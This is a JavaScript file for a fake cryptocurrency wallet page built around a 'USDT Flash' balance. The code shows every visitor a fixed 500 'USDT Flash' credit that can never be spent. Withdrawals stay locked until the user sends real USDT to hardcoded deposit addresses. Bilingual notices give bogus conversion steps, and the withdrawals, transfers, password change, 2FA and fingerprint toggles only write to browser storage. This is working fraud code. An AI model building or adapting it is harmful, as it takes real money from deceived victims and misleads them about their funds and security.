// Wallet State
const walletState = {
    balance: 0,
    balanceVisible: true,
    selectedNetwork: null,
    depositAmount: 0,
    networkFees: {
        TRC20: 0,
        ERC20: 0,
        BEP20: 0
    },
    currentStep: 1,
    transactions: [],
    tokens: {
        'USDT-FLASH': { balance: 0, price: 1.00 },
        USDT: { balance: 0, price: 1.00 },
        PEPE: { balance: 0, price: 0.00001845 },
        DOGE: { balance: 0, price: 0.38 },
        SHIB: { balance: 0, price: 0.00002245 }
    },
    chart: null
};

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    loadWalletData();
    initializeEventListeners();
    initializeChart();
    updateTokensList();
    showFlashNotice();
    updateLivePrices();
    setInterval(updateLivePrices, 5000);
});

// Update Live Prices
async function updateLivePrices() {
    try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tether,pepe,dogecoin,shiba-inu&vs_currencies=usd', {
            method: 'GET',
            headers: {'Accept': 'application/json'}
        });
        
        if (!response.ok) throw new Error('API Error');
        
        const data = await response.json();
        console.log('✅ Prices updated:', data);
        
        if (data.tether) {
            walletState.tokens.USDT.price = data.tether.usd;
            const el = document.getElementById('usdt-price');
            if (el) el.textContent = '$' + data.tether.usd.toFixed(4);
        }
        
        if (data.pepe) {
            walletState.tokens.PEPE.price = data.pepe.usd;
            const el = document.getElementById('pepe-price');
            if (el) el.textContent = '$' + data.pepe.usd.toFixed(8);
        }
        
        if (data.dogecoin) {
            walletState.tokens.DOGE.price = data.dogecoin.usd;
            const el = document.getElementById('doge-price');
            if (el) el.textContent = '$' + data.dogecoin.usd.toFixed(4);
        }
        
        if (data['shiba-inu']) {
            walletState.tokens.SHIB.price = data['shiba-inu'].usd;
            const el = document.getElementById('shib-price');
            if (el) el.textContent = '$' + data['shiba-inu'].usd.toFixed(8);
        }
        
        updateBalanceDisplay();
        updateTokensList();
    } catch (error) {
        console.error('❌ Price update failed:', error);
    }
}

// Show Flash Notice
function showFlashNotice() {
    const userData = JSON.parse(localStorage.getItem('userData') || '{}');
    if (userData.hasSeenFlashNotice) return;
    
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 600px;">
            <div class="modal-header">
                <h2>🔔 USDT Flash Official Notice</h2>
                <button class="close-modal" onclick="this.closest('.modal').remove()">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="flash-notice-content">
                <div class="notice-section">
                    <h3>📌 Approved Procedures for USDT Flash Processing</h3>
                    <div class="notice-step">
                        <span class="step-number">1️⃣</span>
                        <p>Transfer USDT Flash to your wallet inside the website.</p>
                    </div>
                    <div class="notice-step">
                        <span class="step-number">2️⃣</span>
                        <p>After accessing the Flash-supported wallet, convert USDT Flash to supported meme coins (DOGE, SHIB, PEPE or any recommended coin).</p>
                    </div>
                    <div class="notice-step">
                        <span class="step-number">3️⃣</span>
                        <p>Hold the coin for 24 hours without any transactions (sell, transfer, or withdraw).</p>
                    </div>
                    <div class="notice-step">
                        <span class="step-number">4️⃣</span>
                        <p>After 24 hours, sell the coin inside the same wallet to get real USDT that can be withdrawn safely.</p>
                    </div>
                </div>
                <div class="notice-warning">
                    <h3>⚠️ Important Notes</h3>
                    <ul>
                        <li>Transfer must be done exclusively via Flash-supported wallet.</li>
                        <li>Direct conversion from USDT Flash to USDT may result in permanent fund loss.</li>
                        <li>Strict adherence ensures successful processing without delays.</li>
                    </ul>
                </div>
                <hr style="border: 1px solid rgba(255,255,255,0.1); margin: 20px 0;">
                <div class="notice-section" dir="rtl">
                    <h3>📌 الإجراءات المعتمدة لمعالجة رصيد USDT Flash</h3>
                    <div class="notice-step">
                        <span class="step-number">1️⃣</span>
                        <p>تحويل رصيد USDT Flash إلى محفظتك داخل الموقع.</p>
                    </div>
                    <div class="notice-step">
                        <span class="step-number">2️⃣</span>
                        <p>بعد الدخول إلى المحفظة الداعمة لتقنية Flash، يرجى تحويل رصيد USDT Flash إلى إحدى عملات الميم المعتمدة (مثل: DOGE، SHIB، PEPE).</p>
                    </div>
                    <div class="notice-step">
                        <span class="step-number">3️⃣</span>
                        <p>الاحتفاظ بالعملة لمدة 24 ساعة كاملة دون تنفيذ أي حركة (بيع، تحويل، أو سحب).</p>
                    </div>
                    <div class="notice-step">
                        <span class="step-number">4️⃣</span>
                        <p>بعد مرور 24 ساعة، يتم بيع العملة داخل نفس المحفظة للحصول على رصيد USDT حقيقي قابل للسحب.</p>
                    </div>
                </div>
                <div class="notice-warning" dir="rtl">
                    <h3>⚠️ ملاحظات مهمة</h3>
                    <ul>
                        <li>يجب أن يتم التحويل حصريًا عبر المحفظة الداعمة لتقنية Flash.</li>
                        <li>أي محاولة لتحويل USDT Flash مباشرة إلى USDT قد تؤدي إلى فقدان الرصيد بشكل نهائي.</li>
                        <li>الالتزام الدقيق يضمن نجاح العملية دون تأخير.</li>
                    </ul>
                </div>
                <button class="confirm-btn" onclick="document.querySelector('.modal').remove(); localStorage.setItem('userData', JSON.stringify({...JSON.parse(localStorage.getItem('userData') || '{}'), hasSeenFlashNotice: true}))">
                    I Understand / فهمت
                </button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
}

// Load Wallet Data
function loadWalletData() {
    const userData = JSON.parse(localStorage.getItem('userData') || '{}');
    walletState.balance = userData.balance || 0;
    walletState.transactions = userData.transactions || [];
    
    // تحميل أرصدة العملات
    if (userData.tokens) {
        Object.keys(userData.tokens).forEach(token => {
            if (walletState.tokens[token]) {
                walletState.tokens[token].balance = userData.tokens[token];
            }
        });
    }
    
    // رصيد USDT Flash ثابت 500 دائماً
    walletState.tokens['USDT-FLASH'].balance = 500;
    if (!userData.hasFlashBonus) {
        userData.hasFlashBonus = true;
        userData.canWithdrawFlash = false;
        localStorage.setItem('userData', JSON.stringify(userData));
    }
    
    updateBalanceDisplay();
    updateTransactionsList();
    updateHeroBalance();
}

// Update Hero Balance
function updateHeroBalance() {
    // Update hero section if element exists
    const heroBalance = document.getElementById('heroWalletBalance');
    if (heroBalance) {
        // الرصيد دائماً 500 USDT
        heroBalance.textContent = '500.00';
    }
}

// Update hero balance on page load for index page
if (window.location.pathname.includes('index.html') || window.location.pathname === '/' || window.location.pathname.endsWith('/flash/')) {
    document.addEventListener('DOMContentLoaded', () => {
        const heroBalance = document.getElementById('heroWalletBalance');
        if (heroBalance) {
            // الرصيد دائماً 500 USDT
            heroBalance.textContent = '500.00';
        }
    });
}

// Update Balance Display
function updateBalanceDisplay() {
    const balanceElement = document.querySelector('.balance-amount .amount');
    const usdElement = document.getElementById('usdAmount');
    
    // Calculate total balance from all tokens
    let totalBalance = 0;
    Object.keys(walletState.tokens).forEach(token => {
        const tokenData = walletState.tokens[token];
        totalBalance += tokenData.balance * tokenData.price;
    });
    
    walletState.balance = totalBalance;
    
    if (walletState.balanceVisible) {
        balanceElement.textContent = totalBalance.toFixed(2);
        usdElement.textContent = totalBalance.toFixed(2);
    } else {
        balanceElement.textContent = '****';
        usdElement.textContent = '****';
    }
}

// Toggle Balance Visibility
document.getElementById('toggleBalance')?.addEventListener('click', function() {
    walletState.balanceVisible = !walletState.balanceVisible;
    const icon = this.querySelector('i');
    icon.className = walletState.balanceVisible ? 'fas fa-eye' : 'fas fa-eye-slash';
    updateBalanceDisplay();
});

// Initialize Event Listeners
function initializeEventListeners() {
    // Quick Action Buttons
    document.getElementById('depositBtn')?.addEventListener('click', openDepositModal);
    document.getElementById('withdrawBtn')?.addEventListener('click', () => {
        document.getElementById('withdrawModal').classList.add('active');
    });
    document.getElementById('transferBtn')?.addEventListener('click', () => {
        document.getElementById('transferModal').classList.add('active');
    });
    document.getElementById('swapBtn')?.addEventListener('click', () => {
        document.getElementById('swapModal').classList.add('active');
    });
    
    // Scan Button
    document.getElementById('scanBtn')?.addEventListener('click', () => {
        document.getElementById('scanModal').classList.add('active');
    });
    
    // Settings Button
    document.getElementById('settingsBtn')?.addEventListener('click', () => {
        document.getElementById('settingsModal').classList.add('active');
    });
    
    // Close Modal
    document.getElementById('closeModal')?.addEventListener('click', closeDepositModal);
    
    // Network Selection
    document.querySelectorAll('.network-card').forEach(card => {
        card.addEventListener('click', () => selectNetwork(card));
    });
    
    // Step Navigation
    document.getElementById('nextStep1')?.addEventListener('click', () => goToStep(2));
    document.getElementById('backStep2')?.addEventListener('click', () => goToStep(1));
    document.getElementById('nextStep2')?.addEventListener('click', () => goToStep(3));
    document.getElementById('backStep3')?.addEventListener('click', () => goToStep(2));
    document.getElementById('confirmDeposit')?.addEventListener('click', confirmDeposit);
    document.getElementById('doneBtn')?.addEventListener('click', closeDepositModal);
    
    // Amount Input
    const amountInput = document.getElementById('depositAmount');
    amountInput?.addEventListener('input', updateAmountDisplay);
    
    // Quick Amounts
    document.querySelectorAll('.quick-amount').forEach(btn => {
        btn.addEventListener('click', function() {
            const amount = this.dataset.amount;
            amountInput.value = amount;
            updateAmountDisplay();
        });
    });
    
    // Copy Address
    document.getElementById('copyAddress')?.addEventListener('click', copyAddress);
    
    // Withdraw
    document.getElementById('confirmWithdraw')?.addEventListener('click', confirmWithdraw);
    
    // Transfer
    document.getElementById('confirmTransfer')?.addEventListener('click', confirmTransfer);
    
    // Swap
    document.getElementById('swapFromAmount')?.addEventListener('input', calculateSwap);
    document.getElementById('swapFromToken')?.addEventListener('change', calculateSwap);
    document.getElementById('swapToToken')?.addEventListener('change', calculateSwap);
    document.getElementById('confirmSwap')?.addEventListener('click', confirmSwap);
}

// Open Deposit Modal
function openDepositModal() {
    const modal = document.getElementById('depositModal');
    modal.classList.add('active');
    goToStep(1);
}

// Close Deposit Modal
function closeDepositModal() {
    const modal = document.getElementById('depositModal');
    modal.classList.remove('active');
    resetDepositForm();
}

// Select Network
function selectNetwork(card) {
    document.querySelectorAll('.network-card').forEach(c => c.classList.remove('selected'));
    card.classList.add('selected');
    
    walletState.selectedNetwork = card.dataset.network;
    document.getElementById('nextStep1').disabled = false;
    
    updateAmountDisplay();
}

// Go to Step
function goToStep(step) {
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    document.getElementById(`step${step}`).classList.add('active');
    walletState.currentStep = step;
    
    if (step === 3) {
        generateDepositAddress();
    }
}

// Update Amount Display
function updateAmountDisplay() {
    const amount = parseFloat(document.getElementById('depositAmount')?.value || 0);
    walletState.depositAmount = amount;
    
    const fee = walletState.selectedNetwork ? walletState.networkFees[walletState.selectedNetwork] : 0;
    const total = amount + fee;
    
    document.getElementById('amountDisplay').textContent = `${amount.toFixed(2)} USDT`;
    document.getElementById('feeDisplay').textContent = `${fee.toFixed(2)} USDT`;
    document.getElementById('totalDisplay').textContent = `${total.toFixed(2)} USDT`;
    
    const nextBtn = document.getElementById('nextStep2');
    if (nextBtn) {
        nextBtn.disabled = amount < 10;
    }
}

// Generate Deposit Address
function generateDepositAddress() {
    const addresses = {
        TRC20: 'TADdaBsstFr3NVfFqc2T3XmgqXLk8ktBke',
        ERC20: '0x5e3f264c4fb120ae95ce0629c6b7e9dc6db204f0',
        BEP20: '0x5e3f264c4fb120ae95ce0629c6b7e9dc6db204f0'
    };
    
    const qrImages = {
        TRC20: '../Wallet/TRC20.jpg',
        ERC20: '../Wallet/ERC20.jpg',
        BEP20: '../Wallet/BEP20.jpg'
    };
    
    const address = addresses[walletState.selectedNetwork];
    const qrImage = qrImages[walletState.selectedNetwork];
    
    document.getElementById('depositAddress').value = address;
    document.getElementById('selectedNetwork').textContent = walletState.selectedNetwork;
    
    // Display QR Code Image
    const qrCode = document.getElementById('qrCode');
    qrCode.innerHTML = `<img src="${qrImage}" alt="QR Code" style="width: 100%; height: 100%; object-fit: contain;">`;
}

// Copy Address
function copyAddress() {
    const addressInput = document.getElementById('depositAddress');
    addressInput.select();
    document.execCommand('copy');
    
    const btn = document.getElementById('copyAddress');
    const originalHTML = btn.innerHTML;
    btn.innerHTML = '<i class="fas fa-check"></i>';
    
    setTimeout(() => {
        btn.innerHTML = originalHTML;
    }, 2000);
}

// Confirm Deposit
async function confirmDeposit() {
    const txHash = document.getElementById('txHash').value.trim();
    
    if (!txHash) {
        alert('⚠️ Please enter transaction hash');
        return;
    }
    
    let isValidFormat = false;
    if (walletState.selectedNetwork === 'TRC20') {
        isValidFormat = txHash.length === 64;
    } else if (walletState.selectedNetwork === 'ERC20' || walletState.selectedNetwork === 'BEP20') {
        isValidFormat = txHash.startsWith('0x') && txHash.length === 66;
    }
    
    if (!isValidFormat) {
        alert('⚠️ Invalid transaction hash format');
        return;
    }
    
    const confirmBtn = document.getElementById('confirmDeposit');
    confirmBtn.disabled = true;
    confirmBtn.textContent = '⏳ Verifying...';
    
    try {
        const response = await fetch('../api/verify-transaction.php', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                txHash: txHash,
                network: walletState.selectedNetwork,
                amount: walletState.depositAmount
            })
        });
        
        const result = await response.json();
        
        if (!result.success) {
            alert('❌ Verification Failed: ' + result.message);
            confirmBtn.disabled = false;
            confirmBtn.textContent = 'Confirm Deposit';
            return;
        }
        
        const transaction = {
            id: Date.now(),
            type: 'deposit',
            network: walletState.selectedNetwork,
            amount: walletState.depositAmount,
            txHash: txHash,
            status: 'confirmed',
            date: new Date().toISOString()
        };
        
        walletState.transactions.unshift(transaction);
        walletState.balance += walletState.depositAmount;
        walletState.tokens['USDT'].balance += walletState.depositAmount;
        
        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
        if (!userData.canWithdrawFlash) {
            userData.canWithdrawFlash = true;
            userData.hasPurchased = true;
            localStorage.setItem('userData', JSON.stringify(userData));
        }
        
        saveWalletData();
        updateBalanceDisplay();
        updateTransactionsList();
        updateTokensList();
        updateHeroBalance();
        
        document.getElementById('finalNetwork').textContent = walletState.selectedNetwork;
        document.getElementById('finalAmount').textContent = `${walletState.depositAmount.toFixed(2)} USDT`;
        document.getElementById('finalTxHash').textContent = txHash.substring(0, 20) + '...';
        
        goToStep(4);
        
        if (userData.canWithdrawFlash) {
            setTimeout(() => {
                alert('🎉 USDT Flash withdrawal activated!');
            }, 500);
        }
        
    } catch (error) {
        alert('❌ Error: ' + error.message);
        confirmBtn.disabled = false;
        confirmBtn.textContent = 'Confirm Deposit';
    }
}

// Update Transactions List
function updateTransactionsList() {
    const list = document.getElementById('transactionsList');
    
    if (walletState.transactions.length === 0) {
        list.innerHTML = `
            <div class="empty-state">
                <i class="fas fa-receipt"></i>
                <p>No transactions yet</p>
            </div>
        `;
        return;
    }
    
    list.innerHTML = walletState.transactions.map(tx => `
        <div class="transaction-item">
            <div class="tx-icon ${tx.type}">
                <i class="fas fa-arrow-${tx.type === 'deposit' ? 'down' : 'up'}"></i>
            </div>
            <div class="tx-info">
                <span class="tx-type">${tx.type === 'deposit' ? 'Deposit' : 'Withdraw'}</span>
                <span class="tx-date">${new Date(tx.date).toLocaleDateString('ar')}</span>
            </div>
            <div class="tx-amount">
                <span class="amount">${tx.amount.toFixed(2)} USDT</span>
                <span class="status ${tx.status}">${tx.status === 'pending' ? 'Pending' : 'Completed'}</span>
            </div>
        </div>
    `).join('');
}

// Save Wallet Data
function saveWalletData() {
    const userData = JSON.parse(localStorage.getItem('userData') || '{}');
    userData.balance = walletState.balance;
    userData.transactions = walletState.transactions;
    
    // حفظ أرصدة جميع العملات ماعدا USDT Flash (ثابت 500)
    userData.tokens = {};
    Object.keys(walletState.tokens).forEach(token => {
        if (token !== 'USDT-FLASH') {
            userData.tokens[token] = walletState.tokens[token].balance;
        }
    });
    
    localStorage.setItem('userData', JSON.stringify(userData));
}

// Reset Deposit Form
function resetDepositForm() {
    walletState.selectedNetwork = null;
    walletState.depositAmount = 0;
    walletState.currentStep = 1;
    
    document.querySelectorAll('.network-card').forEach(c => c.classList.remove('selected'));
    document.getElementById('depositAmount').value = '';
    document.getElementById('nextStep1').disabled = true;
    document.getElementById('nextStep2').disabled = true;
}

// Initialize Chart
function initializeChart() {
    const ctx = document.getElementById('balanceChart');
    if (!ctx) return;
    
    const gradient = ctx.getContext('2d').createLinearGradient(0, 0, 0, 60);
    gradient.addColorStop(0, 'rgba(255, 255, 255, 0.3)');
    gradient.addColorStop(1, 'rgba(255, 255, 255, 0)');
    
    walletState.chart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: ['', '', '', '', '', '', ''],
            datasets: [{
                data: [100, 120, 115, 134, 168, 132, 150],
                borderColor: '#fff',
                backgroundColor: gradient,
                borderWidth: 2,
                fill: true,
                tension: 0.4,
                pointRadius: 0
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: { display: false },
                tooltip: { enabled: false }
            },
            scales: {
                x: { display: false },
                y: { display: false }
            }
        }
    });
}

// Update Tokens List
function updateTokensList() {
    const tokensList = document.getElementById('tokensList');
    const tokenItems = Array.from(document.querySelectorAll('.token-item'));
    
    // Update balances and calculate values
    tokenItems.forEach(item => {
        const token = item.dataset.token;
        const tokenData = walletState.tokens[token];
        
        if (tokenData) {
            const amountEl = item.querySelector('.token-amount');
            const valueEl = item.querySelector('.token-value');
            const value = tokenData.balance * tokenData.price;
            
            amountEl.textContent = tokenData.balance.toFixed(8);
            valueEl.textContent = `$${value.toFixed(2)}`;
            item.dataset.value = value;
        }
        
        // Remove existing swap button
        const existingBtn = item.querySelector('.token-swap-btn');
        if (existingBtn) existingBtn.remove();
    });
    
    // Sort by value (highest first)
    tokenItems.sort((a, b) => {
        const valueA = parseFloat(a.dataset.value || 0);
        const valueB = parseFloat(b.dataset.value || 0);
        return valueB - valueA;
    });
    
    // Re-append in sorted order
    tokenItems.forEach(item => {
        tokensList.appendChild(item);
        item.addEventListener('click', () => {
            showTokenDetails(item.dataset.token);
        });
    });
}

// Show Token Details
function showTokenDetails(token) {
    const tokenItem = document.querySelector(`[data-token="${token}"]`);
    const existingBtn = tokenItem.querySelector('.token-swap-btn');
    
    if (existingBtn) {
        existingBtn.remove();
        return;
    }
    
    // Remove other swap buttons
    document.querySelectorAll('.token-swap-btn').forEach(btn => btn.remove());
    
    const swapBtn = document.createElement('button');
    swapBtn.className = 'token-swap-btn';
    swapBtn.innerHTML = '<i class="fas fa-sync-alt"></i> Swap Tokens';
    swapBtn.onclick = (e) => {
        e.stopPropagation();
        document.getElementById('swapFromToken').value = token;
        document.getElementById('swapModal').classList.add('active');
    };
    
    tokenItem.appendChild(swapBtn);
}

// Confirm Withdraw
function confirmWithdraw() {
    const address = document.getElementById('withdrawAddress').value;
    const network = document.getElementById('withdrawNetwork').value;
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    
    if (!address || !amount || amount < 10) {
        alert('Please fill all fields correctly');
        return;
    }
    
    // التحقق من إمكانية سحب USDT Flash
    const userData = JSON.parse(localStorage.getItem('userData') || '{}');
    const flashBalance = walletState.tokens['USDT-FLASH'].balance;
    
    if (flashBalance > 0 && !userData.canWithdrawFlash) {
        alert('⚠️ USDT Flash Withdrawal Notice\n\n📌 Required Procedure:\n\n1️⃣ Transfer USDT Flash exclusively to Flash-supported platforms (WEB3)\n\n2️⃣ Convert to supported meme coins (DOGE, SHIB, PEPE)\n\n3️⃣ Hold for 24 hours without any transactions\n\n4️⃣ Sell for real USDT after 24 hours\n\n⚠️ Important:\n• Use only Flash-supported platforms\n• Direct conversion may cause fund rejection\n• Complete a purchase first to activate withdrawal');
        return;
    }
    
    if (amount > walletState.balance) {
        alert('Insufficient balance');
        return;
    }
    
    const transaction = {
        id: Date.now(),
        type: 'withdraw',
        network: network,
        amount: amount,
        address: address,
        status: 'pending',
        date: new Date().toISOString()
    };
    
    walletState.transactions.unshift(transaction);
    walletState.balance -= amount;
    saveWalletData();
    updateBalanceDisplay();
    updateTransactionsList();
    
    document.getElementById('withdrawModal').classList.remove('active');
    alert('Withdrawal request sent successfully');
}

// Confirm Transfer
function confirmTransfer() {
    const to = document.getElementById('transferTo').value;
    const amount = parseFloat(document.getElementById('transferAmount').value);
    const note = document.getElementById('transferNote').value;
    
    if (!to || !amount || amount < 1) {
        alert('Please fill all required fields');
        return;
    }
    
    if (amount > walletState.balance) {
        alert('Insufficient balance');
        return;
    }
    
    const transaction = {
        id: Date.now(),
        type: 'transfer',
        to: to,
        amount: amount,
        note: note,
        status: 'completed',
        date: new Date().toISOString()
    };
    
    walletState.transactions.unshift(transaction);
    walletState.balance -= amount;
    saveWalletData();
    updateBalanceDisplay();
    updateTransactionsList();
    
    document.getElementById('transferModal').classList.remove('active');
    alert('Transfer completed successfully');
}

// Calculate Swap
function calculateSwap() {
    const fromAmount = parseFloat(document.getElementById('swapFromAmount').value) || 0;
    const fromToken = document.getElementById('swapFromToken').value;
    const toToken = document.getElementById('swapToToken').value;
    
    const rates = {
        'USDT-FLASH': 1.00,
        USDT: 1.00,
        PEPE: 0.00001845,
        DOGE: 0.38,
        SHIB: 0.00002245
    };
    
    const fromValue = fromAmount * rates[fromToken];
    const toAmount = fromValue / rates[toToken];
    
    document.getElementById('swapToAmount').value = toAmount.toFixed(8);
    document.getElementById('swapRate').textContent = `1 ${fromToken} = ${(rates[fromToken] / rates[toToken]).toFixed(8)} ${toToken}`;
}

// Confirm Swap
function confirmSwap() {
    const fromAmount = parseFloat(document.getElementById('swapFromAmount').value);
    const fromToken = document.getElementById('swapFromToken').value;
    const toAmount = parseFloat(document.getElementById('swapToAmount').value);
    const toToken = document.getElementById('swapToToken').value;
    
    if (!fromAmount || fromAmount <= 0) {
        alert('Please enter a valid amount');
        return;
    }
    
    // منع تحويل USDT Flash نهائياً
    if (fromToken === 'USDT-FLASH') {
        alert('⚠️ USDT Flash Transfer Notice\n\n📌 Required Steps:\n\n1️⃣ Transfer USDT Flash to a Flash-supported platform (WEB3)\n\n2️⃣ Convert to meme coins (DOGE, SHIB, PEPE)\n\n3️⃣ Hold for 24 hours\n\n4️⃣ Sell for real USDT\n\n⚠️ Direct conversion may result in loss of funds.\n\nComplete a purchase first to unlock this feature.');
        return;
    }
    
    if (walletState.tokens[fromToken].balance < fromAmount) {
        alert('Insufficient balance');
        return;
    }
    
    walletState.tokens[fromToken].balance -= fromAmount;
    walletState.tokens[toToken].balance += toAmount;
    
    // إعادة تعيين USDT Flash إلى 500 دائماً
    walletState.tokens['USDT-FLASH'].balance = 500;
    
    saveWalletData();
    updateBalanceDisplay();
    updateTokensList();
    updateHeroBalance();
    
    document.getElementById('swapModal').classList.remove('active');
    alert(`Swapped ${fromAmount} ${fromToken} to ${toAmount.toFixed(8)} ${toToken}`);
}

// Close modal on outside click
document.getElementById('depositModal')?.addEventListener('click', function(e) {
    if (e.target === this) {
        closeDepositModal();
    }
});

// Token Click Handlers
document.querySelectorAll('.token-item').forEach(item => {
    item.addEventListener('click', function() {
        const token = this.dataset.token;
        showTokenDetails(token);
    });
});

// Settings Event Listeners
document.getElementById('securitySetting')?.addEventListener('click', () => {
    document.getElementById('settingsModal').classList.remove('active');
    document.getElementById('securityModal').classList.add('active');
});

document.getElementById('notificationSetting')?.addEventListener('click', () => {
    document.getElementById('settingsModal').classList.remove('active');
    document.getElementById('notificationModal').classList.add('active');
});

document.getElementById('languageSetting')?.addEventListener('click', () => {
    document.getElementById('settingsModal').classList.remove('active');
    document.getElementById('languageModal').classList.add('active');
});

document.getElementById('backupSetting')?.addEventListener('click', () => {
    document.getElementById('settingsModal').classList.remove('active');
    document.getElementById('backupModal').classList.add('active');
});

// Change Password
document.getElementById('changePassword')?.addEventListener('click', () => {
    const newPassword = prompt('Enter new password:');
    if (newPassword && newPassword.length >= 6) {
        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
        userData.password = newPassword;
        localStorage.setItem('userData', JSON.stringify(userData));
        alert('✅ Password changed successfully');
    } else if (newPassword) {
        alert('⚠️ Password must be at least 6 characters');
    }
});

// 2FA Toggle
document.getElementById('toggle2FA')?.addEventListener('change', function() {
    const userData = JSON.parse(localStorage.getItem('userData') || '{}');
    userData.twoFactorEnabled = this.checked;
    localStorage.setItem('userData', JSON.stringify(userData));
    alert(this.checked ? '✅ Two-factor authentication enabled' : '❌ Two-factor authentication disabled');
});

// Biometric Toggle
document.getElementById('toggleBiometric')?.addEventListener('change', function() {
    const userData = JSON.parse(localStorage.getItem('userData') || '{}');
    userData.biometricEnabled = this.checked;
    localStorage.setItem('userData', JSON.stringify(userData));
    alert(this.checked ? '✅ Fingerprint enabled' : '❌ Fingerprint disabled');
});

// Notification Toggles
document.getElementById('emailNotif')?.addEventListener('change', function() {
    const userData = JSON.parse(localStorage.getItem('userData') || '{}');
    userData.emailNotifications = this.checked;
    localStorage.setItem('userData', JSON.stringify(userData));
});

document.getElementById('pushNotif')?.addEventListener('change', function() {
    const userData = JSON.parse(localStorage.getItem('userData') || '{}');
    userData.pushNotifications = this.checked;
    localStorage.setItem('userData', JSON.stringify(userData));
});

document.getElementById('txNotif')?.addEventListener('change', function() {
    const userData = JSON.parse(localStorage.getItem('userData') || '{}');
    userData.transactionNotifications = this.checked;
    localStorage.setItem('userData', JSON.stringify(userData));
});

// Language Selection
document.querySelectorAll('.lang-option').forEach(option => {
    option.addEventListener('click', function() {
        document.querySelectorAll('.lang-option i').forEach(icon => {
            icon.style.color = 'transparent';
        });
        this.querySelector('i').style.color = '#26a17b';
        
        const lang = this.dataset.lang;
        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
        userData.language = lang;
        localStorage.setItem('userData', JSON.stringify(userData));
        
        alert('✅ Language changed to ' + this.querySelector('.setting-info span:last-child').textContent);
    });
});

// Copy Seed Phrase
document.getElementById('copySeed')?.addEventListener('click', () => {
    const seedWords = Array.from(document.querySelectorAll('.seed-word')).map(el => el.textContent);
    const seedPhrase = seedWords.join(' ');
    
    navigator.clipboard.writeText(seedPhrase).then(() => {
        const btn = document.getElementById('copySeed');
        btn.innerHTML = '<i class="fas fa-check"></i> Copied';
        setTimeout(() => {
            btn.innerHTML = '<i class="fas fa-copy"></i> Copy Phrase';
        }, 2000);
    });
});
